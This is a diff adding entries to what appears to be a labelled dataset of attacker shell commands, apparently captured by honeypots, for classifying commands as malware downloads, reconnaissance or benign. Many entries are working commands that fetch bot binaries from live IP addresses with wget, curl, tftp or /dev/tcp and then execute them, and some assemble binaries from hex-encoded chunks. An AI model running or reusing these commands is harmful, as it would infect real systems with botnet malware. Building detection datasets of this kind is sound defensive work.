+{"command": "wget -q -O bot http://91.92.40.5:8080/bots/bot-x86_64 2>/dev/null || curl -s -o bot http://91.92.40.5:8080/bots/bot-x86_64 2>/dev/null || tftp -g -r bots/bot-x86_64 -l bot 91.92.40.5 2>/dev/null || ftpget -v 91.92.40.5 bot bots/bot-x86_64 2>/dev/null; echo DLDONE", "label": "malware_downloader", "count": 5, "source": "real_round4"}
+{"command": "head -c 0 > /tmp/winminer", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "head -c 0 > /tmp/mips_linux_sign", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EBYVD", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "cat", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w", "label": "malware_downloader", "count": 64, "source": "real_round4"}
+{"command": "ls", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "cd /tmp; ./update.XDarmv5l telnet 2>&1", "label": "malware_execution", "count": 2, "source": "real_round4"}
+{"command": "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW", "label": "benign", "count": 8, "source": "real_round4"}
+{"command": "echo -ne \"\\x20\\x3c\\x26\\x33\\x20\\x3e\\x20\\x24\\x42\\x49\\x4e\\x20\\x26\\x26\\x20\\x63\\x68\\x6d\\x6f\\x64\\x20\\x37\\x37\\x37\\x20\\x24\\x42\\x49\\x4e\\x20\\x26\\x26\\x20\\x24\\x42\\x49\\x4e\\x29\\x0a\\x0a\" >> update.sh", "label": "malware_downloader", "count": 76, "source": "real_round4"}
+{"command": "/bin/busybox echo -ne \"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7D\\x0A\\x0A\" >> .k", "label": "malware_downloader", "count": 42, "source": "real_round4"}
+{"command": "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "./7891.x86_64", "label": "malware_execution", "count": 2, "source": "real_round4"}
+{"command": ">/boot/.codi && cd /boot/", "label": "reconnaissance", "count": 56, "source": "real_round4"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "label": "benign", "count": 4, "source": "real_round4"}
+{"command": "rm -f /tmp/.testfile", "label": "reconnaissance", "count": 15, "source": "real_round4"}
+{"command": "cat /proc/mounts; /bin/busybox MXCOF", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "wget http://5.182.210.174/ok", "label": "malware_downloader", "count": 34, "source": "real_round4"}
+{"command": "echo -ne \"\\x4f\\x54\\x6c\\xf5\\x36\\xfc\\x1a\\xfc\\x31\\x3c\\xe2\\xb7\\x71\\xf7\\x3f\\x25\\x16\\x5d\\x6f\\xab\\x5c\\x81\\x92\\x41\\x1c\\x73\\xb4\\xb4\\xdd\\xcc\\x59\\xa6\" >> update.XDarmv5l", "label": "malware_downloader", "count": 1348, "source": "real_round4"}
+{"command": "echo -ne \"\\x02\\x10\\x81\\xe2\\x02\\x34\\x83\\xe1\\x01\\x00\\x56\\xe1\\x03\\xc0\\x8c\\xe0\\xf8\\xff\\xff\\x1a\\x59\\xff\\xff\\xea\\x42\\x19\\x00\\xeb\\x00\\x08\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 2579, "source": "real_round4"}
+{"command": "nohup $SHELL -c \"curl http://8.222.174.150:60143/linux -o /tmp/Qt28DuiR0T; if [ ! -f /tmp/Qt28DuiR0T ]; then wget http://8.222.174.150:60143/linux -O /tmp/Qt28DuiR0T; fi; if [ ! -f /tmp/Qt28DuiR0T ]; then exec 6<>/dev/tcp/8.222.174.150/60143 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/Qt28DuiR0T && chmod +x /tmp/Qt28DuiR0T && /tmp/Qt28DuiR0T QpkemMfHhAiIODuXF4PFz4AWiDs8mReEzNuHEo0hPoEWmMfDjBCJPj+OBo7bx4QUlz44jQiHwMWMEIk+O4oGh83HmBeMPiGKH5jMwowQiT49jAaCwtuEFY8hPooWmMfHgRyPPz6IFpbExYAIiD07lxeCx9uHEIs1OYkXhM3VghGXODmXEYTbxIEQgzk/iBWA1c2YFIg/IYARmMfBgRyPPz6JEZbBwpgUjTwhiBWH28eEE4M5P4gVhNXBgQiLPDmXFILM244Xgzk/iBSF1c2YFIg3IYgUg9vMhxyPPz6LEJbBwpgUjTwhixKP28SPFoM5P4gUhdXEjhSXPjqICI/bxo8cjz8+iRaWxMGYF4g5IYsWgNvEgx+DOT+IF4DVxIIVlz4+iQiHwMyYF4k4NY8Wh8fElhKOITeACITGx5gXgTo1jxaHxcCWF4g8IYgUg9vEgQiIOz+DEIbExYcGgSE9ixSYxMKHCIg7NoMQhsTFhgaINz2XF4PE248IijY1jxaHxcWWEo4hPosXmMfEhgiMOjWPFofGxpYQiSE9iBKYxMSHCIE4NY8Wh8fClhKOIT2MF5jEw4cIiz03gxCGxMSOBow3IYoRmMTFggiNNjWPFofGxJYSjiE3gAiExseYF4E6NY8Wh8XAlhKOIT2MEpjEx4cIijs1jxaHwc2WFIg+IYAWmMfBgQiIPjyDEIbExIEGiD43lxWH28eCEpc+PYEcgMXEhBCZPj2MCIfHwZgfjyE+ixyAxcSEFJk7OJcUhcPbhxKNIT2IEozDxYcUji86gAiFw9uOFZc+Po4cgMXEhhEwkbH9LNlLlyg/Iig=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/Qt28DuiR0T && /tmp/Qt28DuiR0T QpkemMfHhAiIODuXF4PFz4AWiDs8mReEzNuHEo0hPoEWmMfDjBCJPj+OBo7bx4QUlz44jQiHwMWMEIk+O4oGh83HmBeMPiGKH5jMwowQiT49jAaCwtuEFY8hPooWmMfHgRyPPz6IFpbExYAIiD07lxeCx9uHEIs1OYkXhM3VghGXODmXEYTbxIEQgzk/iBWA1c2YFIg/IYARmMfBgRyPPz6JEZbBwpgUjTwhiBWH28eEE4M5P4gVhNXBgQiLPDmXFILM244Xgzk/iBSF1c2YFIg3IYgUg9vMhxyPPz6LEJbBwpgUjTwhixKP28SPFoM5P4gUhdXEjhSXPjqICI/bxo8cjz8+iRaWxMGYF4g5IYsWgNvEgx+DOT+IF4DVxIIVlz4+iQiHwMyYF4k4NY8Wh8fElhKOITeACITGx5gXgTo1jxaHxcCWF4g8IYgUg9vEgQiIOz+DEIbExYcGgSE9ixSYxMKHCIg7NoMQhsTFhgaINz2XF4PE248IijY1jxaHxcWWEo4hPosXmMfEhgiMOjWPFofGxpYQiSE9iBKYxMSHCIE4NY8Wh8fClhKOIT2MF5jEw4cIiz03gxCGxMSOBow3IYoRmMTFggiNNjWPFofGxJYSjiE3gAiExseYF4E6NY8Wh8XAlhKOIT2MEpjEx4cIijs1jxaHwc2WFIg+IYAWmMfBgQiIPjyDEIbExIEGiD43lxWH28eCEpc+PYEcgMXEhBCZPj2MCIfHwZgfjyE+ixyAxcSEFJk7OJcUhcPbhxKNIT2IEozDxYcUji86gAiFw9uOFZc+Po4cgMXEhhEwkbH9LNlLlyg/Iig=\" &", "label": "malware_downloader", "count": 1, "source": "real_round4"}
+{"command": "/bin/busybox ECCHI", "label": "reconnaissance", "count": 42, "source": "real_round4"}
+{"command": "zyad5001", "label": "benign", "count": 2, "source": "real_round4"}
+{"command": "curl http://176.65.139.202:80/telnet.sh -o /var/tmp/telnet.sh;chmod 777 /var/tmp/telnet.sh;sh /var/tmp/telnet.sh", "label": "malware_downloader", "count": 3, "source": "real_round4"}
+{"command": "tftp; wget; /bin/busybox EBYVD", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg", "label": "benign", "count": 8, "source": "real_round4"}
+{"command": "/bin/busybox cat /proc/mounts; /bin/busybox bQCMF6Fj ", "label": "reconnaissance", "count": 1, "source": "real_round4"}
+{"command": "wget -qO- http://45.74.3.37:5001/bins.sh", "label": "malware_downloader", "count": 1, "source": "real_round4"}
+{"command": "ps | grep '[Mm]iner'", "label": "reconnaissance", "count": 14, "source": "real_round4"}
+{"command": ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/", "label": "reconnaissance", "count": 65, "source": "real_round4"}
+{"command": "clear", "label": "benign", "count": 1, "source": "real_round4"}
+{"command": "wget -O /tmp/bins.sh http://45.74.3.37:5001/bins.sh && chmod +x /tmp/bins.sh && /tmp/bins.sh", "label": "malware_downloader", "count": 1, "source": "real_round4"}
+{"command": "echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "label": "reconnaissance", "count": 27665, "source": "real_round4"}
+{"command": "(score+3)", "label": "benign", "count": 50, "source": "real_round4"}
